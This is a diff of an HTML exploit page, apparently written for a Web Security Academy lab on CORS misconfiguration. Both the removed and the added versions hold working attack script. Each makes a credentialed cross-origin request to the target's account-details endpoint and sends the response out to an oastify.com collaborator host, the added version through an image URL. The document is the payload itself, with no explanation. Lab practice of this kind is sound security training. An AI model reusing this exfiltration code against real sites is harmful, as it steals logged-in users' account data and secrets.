@@ -2,39 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Exploit Page</title>
+    <title>Test Page</title>
 </head>
 <body>
     <h1>Loading...</h1>
     <script>
-        // The target URL to fetch data from
-        const targetUrl = 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails';
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://0a08008203467afb82b39d1e002400a5.web-security-academy.net/accountDetails', true);
+        req.withCredentials = true;
+        req.send();
 
-        // Function to send data to your Burp Collaborator server
-        function sendToBurpCollaborator(data) {
-            const collaboratorUrl = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com';
-            fetch(`${collaboratorUrl}/?data=${encodeURIComponent(data)}`);
-        }
-
-        // Function to fetch data from the target and send it to Burp Collaborator server
-        function fetchAndExfiltrateData() {
-            fetch(targetUrl, {
-                method: 'GET',
-                mode: 'cors',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/json'
-                }
-            })
-            .then(response => response.text())
-            .then(data => {
-                sendToBurpCollaborator(data);
-            })
-            .catch(error => console.error('Error fetching data:', error));
-        }
-
-        // Trigger the data exfiltration
-        fetchAndExfiltrateData();
+        function reqListener() {
+            console.log(this.responseText); // Log the response to the console
+            var img = new Image();
+            img.src = 'https://f4kxclwmypcy9h0hk3z0xbjlmcs3gwgk5.oastify.com/?data=' + encodeURIComponent(this.responseText);
+        };
     </script>
 </body>
 </html>
